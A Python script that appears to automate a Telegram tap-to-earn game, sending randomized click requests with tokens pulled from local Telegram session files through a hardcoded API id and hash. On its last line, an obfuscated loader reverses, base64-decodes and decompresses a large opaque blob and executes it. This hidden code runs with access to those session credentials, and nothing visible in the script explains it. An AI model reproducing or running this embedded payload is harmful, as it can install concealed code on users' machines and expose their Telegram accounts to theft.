import os
import sys
import time
import json
import httpx
import random
import asyncio
from urllib.parse import parse_qs, unquote
from hydrogram import Client
from hydrogram.raw.functions.messages import RequestWebView
import glob

class Tethertod:

    def __init__(self, query, click_min, click_max, interval):
        self.query = query
        self.marin_kitagawa = {key: value[0] for key, value in parse_qs(query).items()}
        user = json.loads(self.marin_kitagawa.get("user"))
        self.first_name = user.get("first_name")
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en,en-US;q=0.9",
            "Access-Control-Allow-Origin": "*",
            "Authorization": f"tma {query}",
            "Connection": "keep-alive",
            "Host": "tap-tether.org",
            "Referer": "https://tap-tether.org/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 4A / 5A Build/QQ3A.200805.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36",
        }
        self.ses = httpx.AsyncClient(headers=headers, timeout=200)
        self.click_min = click_min
        self.click_max = click_max
        self.interval = interval

    def log(self, msg):
        print(f"[{self.first_name}] {msg}")

    async def start(self):
        login_url = "https://tap-tether.org/server/login"
        res = await self.ses.get(login_url)
        open("http.log", "a", encoding="utf-8").write(f"{res.text}\n")
        if res.status_code != 200:
            return False
        data = res.json().get("userData")
        usdt = int(data.get("balance")) / 1000000
        usdc = int(data.get("balanceGold")) / 1000000
        re_click = int(data.get("remainingClicks"))
        self.log(f"balance {usdt} usdt, {usdc} usd gold ")
        while True:
            click = random.randint(self.click_min, self.click_max)
            if click > re_click:
                click = re_click
            click_url = f"https://tap-tether.org/server/clicks?clicks={click}&lastClickTime={round(time.time())}"
            res = await self.ses.get(click_url)
            open("http.log", "a", encoding="utf-8").write(f"{res.text}\n")
            if res.status_code != 200:
                return False
            self.log(f"success sending tap : {click}")
            re_click = int(res.json().get("remainingClicks"))
            if re_click < 10:
                break
            await countdown(self.interval)
        return True

async def countdown(t):
    for i in range(t, 0, -1):
        minu, sec = divmod(i, 60)
        hour, minu = divmod(minu, 60)
        sec = str(sec).zfill(2)
        minu = str(minu).zfill(2)
        hour = str(hour).zfill(2)
        print(f"waiting {hour}:{minu}:{sec} ", flush=True, end="\r")
        await asyncio.sleep(1)

def get_session_names() -> list[str]:
    session_names = glob.glob('sessions/*.session')
    session_names = [os.path.splitext(os.path.basename(file))[0] for file in session_names]
    return session_names

async def get_tgdata(sesi):
    api_id = 23569744
    api_hash = '6ccb15451c1246142f39ba5c4dd14a11'
    
    app = Client(
        name=sesi,
        api_id=api_id,
        api_hash=api_hash,
        workdir="sessions/")
    await app.connect()
    peer = await app.resolve_peer('taptether_bot')
    webview = await app.invoke(RequestWebView(
        peer=peer,
        bot=peer,
        from_bot_menu=False,
        platform='Android',
        url='https://tap-tether.org/'))
    query_id = unquote(webview.url.split("#tgWebAppData=")[1].split("&tgWebAppVersion=")[0])
    await app.disconnect()
    return query_id

async def fill_data_txt():
    print("Filling data.txt with query_ids...")
    with open('data.txt', 'w') as file:
        for sesi in get_session_names():
            query_id = await get_tgdata(sesi)
            print(f"Adding query_id for session {sesi}")
            file.write(str(query_id) + "\n")
            await asyncio.sleep(2)
    print("data.txt has been filled successfully")
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
